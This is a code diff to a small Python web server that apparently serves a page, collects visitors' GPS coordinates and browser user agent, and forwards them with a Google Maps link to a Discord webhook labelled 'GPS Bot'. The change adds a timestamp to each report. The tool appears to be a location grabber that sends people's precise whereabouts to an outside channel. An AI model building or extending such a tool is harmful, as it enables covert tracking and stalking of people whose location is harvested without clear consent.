@@ -1,6 +1,7 @@
 import json
 import requests
 from http.server import BaseHTTPRequestHandler, HTTPServer
+from datetime import datetime
 
 HTML_CONTENT = b"""<!DOCTYPE html>
 <html>
@@ -52,6 +53,9 @@ class RequestHandler(BaseHTTPRequestHandler):
         longitude = data.get('longitude')
         user_agent = data.get('userAgent')
 
+        # Get current time
+        current_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+
         # Create Google Maps link
         maps_url = f"https://www.google.com/maps?q={latitude},{longitude}"
 
@@ -66,6 +70,7 @@ class RequestHandler(BaseHTTPRequestHandler):
                         {"name": "🌍 ตำแหน่ง (Latitude, Longitude)", "value": f"{latitude}, {longitude}", "inline": True},
                         {"name": "📍 ดูตำแหน่งบน Google Maps", "value": f"[เปิดใน Google Maps]({maps_url})", "inline": False},
                         {"name": "📱 User-Agent", "value": user_agent, "inline": False},
+                        {"name": "⏰ เวลาปัจจุบัน", "value": current_time, "inline": False},
                     ],
                     "footer": {"text": "ส่งโดย GPS Bot"}
                 }
@@ -76,7 +81,7 @@ class RequestHandler(BaseHTTPRequestHandler):
         try:
             response = requests.post(DISCORD_WEBHOOK_URL, json=embed)
             if response.status_code == 204:
-                print(f"ส่งข้อมูลไปที่ Discord: {latitude}, {longitude}")
+                print(f"ส่งข้อมูลไปที่ Discord: {latitude}, {longitude} เวลา: {current_time}")
             else:
                 print(f"ไม่สามารถส่งข้อมูลไปที่ Discord ได้: {response.status_code} - {response.text}")
         except Exception as e:
